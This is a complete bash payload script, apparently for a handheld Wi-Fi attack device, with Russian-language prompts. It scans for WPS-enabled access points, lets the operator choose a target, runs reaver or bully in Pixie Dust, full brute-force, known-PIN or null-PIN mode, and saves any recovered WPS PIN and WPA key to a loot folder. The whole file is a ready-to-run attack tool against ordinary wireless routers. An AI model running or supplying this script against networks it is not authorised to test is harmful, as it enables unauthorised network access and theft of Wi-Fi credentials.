#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: WPS Bruteforce
# Author: NullSec
# Description: WPS PIN brute force using reaver/bully with Pixie Dust support
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/wpsbrute"
mkdir -p "$LOOT_DIR"

PROMPT "ПЕРЕБОР WPS

Перебирайте PIN-коды WPS
для восстановления ключей.

Возможности:
- Атака Reaver PIN
- Атака Bully PIN
- Pixie Dust (оффлайн)
- Собств. список PIN
- Автоопределение целей

ВНИМАНИЕ: Активная атака
Может занять часы.

Нажмите OK для настройки."

# Check for attack tools
HAS_REAVER=0
HAS_BULLY=0
command -v reaver >/dev/null 2>&1 && HAS_REAVER=1
command -v bully >/dev/null 2>&1 && HAS_BULLY=1

if [ $HAS_REAVER -eq 0 ] && [ $HAS_BULLY -eq 0 ]; then
    ERROR_DIALOG "Инструменты WPS не найдены!

Установите reaver или bully:
opkg install reaver
opkg install bully"
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done

if [ -z "$MONITOR_IF" ]; then
    ERROR_DIALOG "Нет интерфейса монитор!

Включите режим монитор:
airmon-ng start wlan1"
    exit 1
fi

PROMPT "РЕЖИМ АТАКИ:

1. Pixie Dust (быстро)
2. Перебор PIN-кодов
3. Известные PIN-коды
4. Тест NULL PIN

Инструменты: $([ $HAS_REAVER -eq 1 ] && echo "reaver ")$([ $HAS_BULLY -eq 1 ] && echo "bully")
Монитор: $MONITOR_IF

Выберите режим."

ATTACK_MODE=$(NUMBER_PICKER "Режим (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_MODE=1 ;; esac

# Scan for WPS targets
SPINNER_START "Сканирование точек WPS..."

SCAN_FILE="/tmp/wps_scan_$$.txt"
if command -v wash >/dev/null 2>&1; then
    timeout 15 wash -i "$MONITOR_IF" -C 2>/dev/null | grep -v "^-" | grep -v "^BSSID" > "$SCAN_FILE"
elif [ $HAS_REAVER -eq 1 ]; then
    timeout 15 reaver -i "$MONITOR_IF" -vv --scan 2>/dev/null | grep "WPS" > "$SCAN_FILE"
fi

SPINNER_STOP

TARGET_COUNT=$(wc -l < "$SCAN_FILE" 2>/dev/null | tr -d ' ')
[ "$TARGET_COUNT" = "0" ] && { ERROR_DIALOG "Точки WPS не найдены!"; rm -f "$SCAN_FILE"; exit 1; }

TARGET_LIST=$(head -8 "$SCAN_FILE" | awk '{print NR". "$1" "$6}')

PROMPT "ЦЕЛИ WPS: $TARGET_COUNT

$TARGET_LIST

Выберите цель.
Введите BSSID цели."

TARGET_BSSID=$(TEXT_PICKER "BSSID цели:" "$(head -1 "$SCAN_FILE" | awk '{print $1}')")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) rm -f "$SCAN_FILE"; exit 0 ;; esac

TARGET_CHANNEL=$(grep "$TARGET_BSSID" "$SCAN_FILE" | awk '{print $2}')
TARGET_CHANNEL=${TARGET_CHANNEL:-6}

# Tool selection
if [ $HAS_REAVER -eq 1 ] && [ $HAS_BULLY -eq 1 ]; then
    PROMPT "ВЫБЕРИТЕ ИНСТРУМЕНТ:

1. Reaver
2. Bully

Выберите инструмент."
    TOOL_PICK=$(NUMBER_PICKER "Инструмент (1-2):" 1)
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TOOL_PICK=1 ;; esac
    [ "$TOOL_PICK" = "2" ] && USE_TOOL="bully" || USE_TOOL="reaver"
elif [ $HAS_REAVER -eq 1 ]; then
    USE_TOOL="reaver"
else
    USE_TOOL="bully"
fi

TIMEOUT_MIN=$(NUMBER_PICKER "Тайм-аут (мин):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TIMEOUT_MIN=60 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ WPS?

Цель: $TARGET_BSSID
Канал: $TARGET_CHANNEL
Инструмент: $USE_TOOL
Режим: $ATTACK_MODE
Тайм-аут: ${TIMEOUT_MIN}м

Это активная атака.

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f "$SCAN_FILE"; exit 0; }

TIMESTAMP=$(date +%Y%m%d_%H%M)
OUTPUT_FILE="$LOOT_DIR/wps_${TARGET_BSSID//:/}_$TIMESTAMP.log"

LOG "Запуск атаки WPS на $TARGET_BSSID..."
SPINNER_START "Атака на PIN-коды WPS..."

TIMEOUT_SEC=$((TIMEOUT_MIN * 60))

case $USE_TOOL in
    reaver)
        case $ATTACK_MODE in
            1) # Pixie Dust
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -K 1 -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            2) # Full brute force
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -d 2 -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            3) # Known PINs
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -p "" -d 1 -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            4) # Null PIN
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -p "" -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
        esac
        ;;
    bully)
        case $ATTACK_MODE in
            1) # Pixie Dust
                timeout "$TIMEOUT_SEC" bully "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -d -v 3 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            2) # Full brute force
                timeout "$TIMEOUT_SEC" bully "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -v 3 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            3|4)
                timeout "$TIMEOUT_SEC" bully "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -v 3 2>&1 | tee "$OUTPUT_FILE" &
                ;;
        esac
        ;;
esac
ATTACK_PID=$!

SPINNER_STOP

PROMPT "АТАКА WPS В ПРОЦЕССЕ

Цель: $TARGET_BSSID
Инструмент: $USE_TOOL
Тайм-аут: ${TIMEOUT_MIN}м

Журнал:
$OUTPUT_FILE

Нажмите OK для ожидания
иходов или тайм-аута."

# Wait for attack
wait $ATTACK_PID 2>/dev/null

# Check results
WPS_PIN=$(grep -oE 'WPS PIN:.*' "$OUTPUT_FILE" 2>/dev/null | head -1)
WPA_KEY=$(grep -oE 'WPA PSK:.*' "$OUTPUT_FILE" 2>/dev/null | head -1)
ATTEMPTS=$(grep -c "Trying pin" "$OUTPUT_FILE" 2>/dev/null)

rm -f "$SCAN_FILE"

if [ -n "$WPA_KEY" ]; then
    PROMPT "WPS ВЗЛОМАН!

$WPS_PIN
$WPA_KEY

Цель: $TARGET_BSSID
Попыток: $ATTEMPTS

Сохранено: $OUTPUT_FILE

Нажмите OK для выхода."
elif [ -n "$WPS_PIN" ]; then
    PROMPT "PIN НАЙДЕН!

$WPS_PIN
(Ключ не восстановлен)

Цель: $TARGET_BSSID
Попыток: $ATTEMPTS

Сохранено: $OUTPUT_FILE

Нажмите OK для выхода."
else
    PROMPT "АТАКА ЗАВЕРШЕНА

PIN не найден.
Попыток: $ATTEMPTS

Цель может иметь
блокировку WPS или
ограничение скорости.

Журнал: $OUTPUT_FILE

Нажмите OK для выхода."
fi
